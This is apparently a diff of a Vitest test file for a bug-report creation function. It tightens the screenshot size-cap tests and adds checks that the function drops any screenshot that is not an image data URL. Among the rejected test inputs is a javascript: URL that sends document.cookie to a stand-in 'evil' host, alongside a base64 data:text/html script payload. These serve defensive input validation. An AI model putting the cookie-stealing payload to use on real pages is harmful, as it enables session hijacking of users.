@@ -1,5 +1,6 @@
 // @vitest-environment node
 
+import type { JsonObject } from "~/lib/json-value";
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import { Prisma } from "@prisma/client";
 
@@ -273,10 +274,15 @@ describe("createBugReport — field caps and redaction (#979)", () => {
     prismaMock.bugReport.create.mockResolvedValue(CREATED_REPORT);
   });
 
+  const SCREENSHOT_PREFIX = "data:image/png;base64,";
+  /** A valid image data URL padded to exactly `length` characters. */
+  const dataUrlOfLength = (length: number) =>
+    SCREENSHOT_PREFIX + "A".repeat(length - SCREENSHOT_PREFIX.length);
+
   it("drops an oversized screenshot but still persists the report (#1116 review)", async () => {
     const r = await createBugReport({
       ...BASE_PAYLOAD,
-      screenshot: "x".repeat(BUG_REPORT_FIELD_LIMITS.screenshot + 1),
+      screenshot: dataUrlOfLength(BUG_REPORT_FIELD_LIMITS.screenshot + 1),
       consoleLogs: "console capture worth keeping",
     });
     expect(r).toEqual(OK_RESULT);
@@ -288,7 +294,7 @@ describe("createBugReport — field caps and redaction (#979)", () => {
   });
 
   it("keeps a screenshot at exactly the cap", async () => {
-    const screenshot = "x".repeat(BUG_REPORT_FIELD_LIMITS.screenshot);
+    const screenshot = dataUrlOfLength(BUG_REPORT_FIELD_LIMITS.screenshot);
     const r = await createBugReport({ ...BASE_PAYLOAD, screenshot });
     expect(r).toEqual(OK_RESULT);
     expect(prismaMock.bugReport.create.mock.calls[0][0].data.screenshot).toBe(screenshot);
@@ -352,11 +358,50 @@ describe("createBugReport — field caps and redaction (#979)", () => {
   });
 
   it("drops non-JSON-serializable context to DbNull instead of failing", async () => {
-    const r = await createBugReport({
-      ...BASE_PAYLOAD,
-      context: { big: BigInt(1) },
-    });
+    const context: JsonObject = {};
+    // A BigInt cannot arrive through `JSON.parse`, so the payload type says it
+    // cannot be here. Writing it in anyway is how this test reaches the branch
+    // that drops a context `JSON.stringify` refuses to serialize.
+    Reflect.set(context, "big", BigInt(1));
+    const r = await createBugReport({ ...BASE_PAYLOAD, context });
     expect(r).toEqual(OK_RESULT);
     expect(prismaMock.bugReport.create.mock.calls[0][0].data.context).toEqual(Prisma.DbNull);
+  });
+});
+
+describe("createBugReport — screenshot scheme validation (#1570)", () => {
+  beforeEach(() => {
+    vi.clearAllMocks();
+    prismaMock.user.findUnique.mockResolvedValue(VALID_USER);
+    prismaMock.bugReport.create.mockResolvedValue(CREATED_REPORT);
+  });
+
+  it.each([
+    "javascript:fetch('//evil/'+document.cookie)",
+    "https://evil.example.com/x.png",
+    "data:text/html;base64,PHNjcmlwdD4=",
+    "not a url at all",
+    "  data:image/png;base64,abc", // leading space defeats the anchored scheme
+  ])("drops a non-image-data-URL screenshot (%s) but still persists the report", async (bad) => {
+    const r = await createBugReport({
+      ...BASE_PAYLOAD,
+      screenshot: bad,
+      consoleLogs: "keep me",
+    });
+    expect(r).toEqual(OK_RESULT);
+    const data = prismaMock.bugReport.create.mock.calls[0][0].data;
+    expect(data.screenshot).toBeNull();
+    expect(data.consoleLogs).toBe("keep me");
+  });
+
+  it.each([
+    "data:image/png;base64,iVBORw0KGgo=",
+    "data:image/jpeg;base64,/9j/4AAQ",
+    "data:image/webp;base64,UklGRg==",
+    "data:image/gif;base64,R0lGODlh",
+  ])("stores a valid image data URL (%s)", async (good) => {
+    const r = await createBugReport({ ...BASE_PAYLOAD, screenshot: good });
+    expect(r).toEqual(OK_RESULT);
+    expect(prismaMock.bugReport.create.mock.calls[0][0].data.screenshot).toBe(good);
   });
 });
